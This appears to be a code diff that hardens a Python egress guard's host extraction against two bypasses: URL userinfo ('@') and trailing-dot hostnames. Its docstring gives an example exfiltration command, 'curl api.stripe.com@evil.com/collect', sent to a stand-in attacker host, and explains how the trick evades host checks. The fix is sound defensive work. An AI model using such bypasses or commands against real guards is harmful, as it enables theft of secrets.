@@ -65,6 +65,30 @@ _BARE_HOST_RE = re.compile(
 _TOKEN_SPLIT = re.compile(r"[\s\"'`,;=(){}\[\]<>]+")
 
 
+def _destination_of(tok: str) -> str:
+    """Reduce a schemeless token to the host a client would actually contact.
+
+    Two shapes defeated _BARE_HOST_RE outright, and because this guard denies
+    only when it FINDS a disallowed host, matching nothing means ALLOW — so
+    each was a silent exfiltration path, not a missed warning:
+
+    * RFC-3986 userinfo. ``curl api.stripe.com@evil.com/collect`` connects to
+      evil.com — everything before the LAST "@" is credentials. The anchored
+      _BARE_HOST_RE saw "api.stripe.com" followed by "@" and matched nothing,
+      so a request carrying a host-restricted secret to evil.com was allowed
+      while the identical `https://` form was correctly denied (urlparse
+      handles userinfo; the bare-host fallback did not).
+    * A trailing dot. "evil.com." is a valid absolute FQDN and resolves the
+      same, but the final label ended in "." so the anchored pattern failed.
+    """
+    if "@" in tok:
+        tok = tok.rsplit("@", 1)[1]
+    # Strip a trailing dot only from the host part, before any port/path.
+    head, sep, rest = tok.partition("/")
+    head = head.rstrip(".") if ":" not in head else head
+    return head + sep + rest
+
+
 def _hosts_in(text: str) -> set[str]:
     hosts: set[str] = set()
     for u in _URL_RE.findall(text):
@@ -83,6 +107,9 @@ def _hosts_in(text: str) -> set[str]:
         # skipping "://" tokens here just avoids re-processing them, not a
         # gap (that was the pre-fix bug: _URL_RE itself missed them).
         if not tok or "://" in tok:
+            continue
+        tok = _destination_of(tok)
+        if not tok:
             continue
         m = _BARE_HOST_RE.match(tok)
         if m:
